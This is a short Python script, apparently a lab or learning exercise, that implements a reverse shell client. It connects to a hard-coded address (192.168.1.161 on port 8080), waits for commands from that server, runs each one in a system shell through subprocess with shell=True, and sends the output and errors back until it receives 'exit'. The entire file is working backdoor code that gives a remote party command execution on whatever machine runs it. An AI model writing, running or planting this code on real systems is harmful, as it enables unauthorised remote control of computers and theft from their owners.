import socket
# used to start a shell in the system and run commands from server
import subprocess

def connect():
    # create socket object
    s = socket.socket()
    # pass the IP and port of the server
    s.connect(("192.168.1.161", 8080))
    
    while True:
        command = s.recv(1024)
        # end the connection if exit is inputted
        if 'exit' in command.decode():
            s.close()
            break
        else:
            # create object CMD, open the shell using subprocess, and pipe outputs to standard output and error variables
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
            
def main():
    connect()
main()